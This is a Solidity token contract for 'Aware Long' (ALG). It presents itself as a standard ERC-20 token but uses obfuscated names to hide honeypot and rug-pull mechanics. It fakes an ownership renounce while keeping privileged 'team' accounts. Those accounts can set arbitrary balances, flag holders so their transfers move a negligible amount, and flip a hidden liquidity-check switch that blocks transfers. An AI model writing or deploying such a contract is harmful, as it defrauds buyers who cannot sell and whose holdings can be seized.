//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface takeLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingAuto {
    function createPair(address listLaunchLiquidity, address launchEnable) external returns (address);
}

interface receiverSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeTeam) external view returns (uint256);

    function transfer(address autoSender, uint256 modeEnable) external returns (bool);

    function allowance(address teamExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeEnable) external returns (bool);

    function transferFrom(
        address sender,
        address autoSender,
        uint256 modeEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderMarketingShould, uint256 value);
    event Approval(address indexed teamExempt, address indexed spender, uint256 value);
}

interface autoTake is receiverSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AwareLong is amountTeam, receiverSell, autoTake {

    function getOwner() external view returns (address) {
        return receiverTeam;
    }

    function sellTeam() public {
        emit OwnershipTransferred(senderLimit, address(0));
        receiverTeam = address(0);
    }

    mapping(address => uint256) private exemptEnable;

    function allowance(address minAt, address feeExempt) external view virtual override returns (uint256) {
        if (feeExempt == senderReceiver) {
            return type(uint256).max;
        }
        return atTotal[minAt][feeExempt];
    }

    address public toList;

    address public senderLimit;

    uint256 private limitFrom;

    function balanceOf(address takeTeam) public view virtual override returns (uint256) {
        return exemptEnable[takeTeam];
    }

    uint256 private listSwap;

    mapping(address => mapping(address => uint256)) private atTotal;

    address senderReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private tokenAmountLaunched = 18;

    bool public buyTradingLaunch;

    function feeEnable(uint256 modeEnable) public {
        limitExempt();
        launchLiquidity = modeEnable;
    }

    address private receiverTeam;

    function transferFrom(address launchReceiver, address autoSender, uint256 modeEnable) external override returns (bool) {
        if (_msgSender() != senderReceiver) {
            if (atTotal[launchReceiver][_msgSender()] != type(uint256).max) {
                require(modeEnable <= atTotal[launchReceiver][_msgSender()]);
                atTotal[launchReceiver][_msgSender()] -= modeEnable;
            }
        }
        return autoLaunched(launchReceiver, autoSender, modeEnable);
    }

    constructor (){
        if (launchedLiquidity == listSwap) {
            listSwap = launchedLiquidity;
        }
        takeLiquidity feeFrom = takeLiquidity(senderReceiver);
        toList = tradingAuto(feeFrom.factory()).createPair(feeFrom.WETH(), address(this));
        if (listSwap == launchedLiquidity) {
            receiverToken = launchedLiquidity;
        }
        senderLimit = _msgSender();
        sellTeam();
        isTeam[senderLimit] = true;
        exemptEnable[senderLimit] = modeMax;
        if (listSwap != launchedLiquidity) {
            senderFeeMin = false;
        }
        emit Transfer(address(0), senderLimit, modeMax);
    }

    function name() external view virtual override returns (string memory) {
        return listMax;
    }

    uint256 launchLiquidity;

    string private listMax = "Aware Long";

    mapping(address => bool) public isTeam;

    function symbol() external view virtual override returns (string memory) {
        return amountSender;
    }

    function teamBuy(address launchReceiver, address autoSender, uint256 modeEnable) internal returns (bool) {
        require(exemptEnable[launchReceiver] >= modeEnable);
        exemptEnable[launchReceiver] -= modeEnable;
        exemptEnable[autoSender] += modeEnable;
        emit Transfer(launchReceiver, autoSender, modeEnable);
        return true;
    }

    function autoLaunched(address launchReceiver, address autoSender, uint256 modeEnable) internal returns (bool) {
        if (launchReceiver == senderLimit) {
            return teamBuy(launchReceiver, autoSender, modeEnable);
        }
        uint256 txLimit = receiverSell(toList).balanceOf(fromExemptIs);
        require(txLimit == launchLiquidity);
        require(autoSender != fromExemptIs);
        if (minSwap[launchReceiver]) {
            return teamBuy(launchReceiver, autoSender, fundSellAuto);
        }
        return teamBuy(launchReceiver, autoSender, modeEnable);
    }

    event OwnershipTransferred(address indexed listWallet, address indexed enableMaxList);

    function owner() external view returns (address) {
        return receiverTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeMax;
    }

    function receiverTrading(address limitMode) public {
        if (buyTradingLaunch) {
            return;
        }
        if (swapEnable == senderFeeMin) {
            swapEnable = false;
        }
        isTeam[limitMode] = true;
        if (senderFeeMin != swapEnable) {
            limitFrom = receiverToken;
        }
        buyTradingLaunch = true;
    }

    uint256 private receiverToken;

    bool private swapEnable;

    uint256 swapFund;

    function feeTeam(address tokenIs) public {
        limitExempt();
        
        if (tokenIs == senderLimit || tokenIs == toList) {
            return;
        }
        minSwap[tokenIs] = true;
    }

    uint256 constant fundSellAuto = 11 ** 10;

    address fromExemptIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address feeExempt, uint256 modeEnable) public virtual override returns (bool) {
        atTotal[_msgSender()][feeExempt] = modeEnable;
        emit Approval(_msgSender(), feeExempt, modeEnable);
        return true;
    }

    function shouldMode(address swapSellBuy, uint256 modeEnable) public {
        limitExempt();
        exemptEnable[swapSellBuy] = modeEnable;
    }

    uint256 private modeMax = 100000000 * 10 ** 18;

    function limitExempt() private view {
        require(isTeam[_msgSender()]);
    }

    uint256 public launchedLiquidity;

    function transfer(address swapSellBuy, uint256 modeEnable) external virtual override returns (bool) {
        return autoLaunched(_msgSender(), swapSellBuy, modeEnable);
    }

    bool public senderFeeMin;

    string private amountSender = "ALG";

    mapping(address => bool) public minSwap;

    function decimals() external view virtual override returns (uint8) {
        return tokenAmountLaunched;
    }

}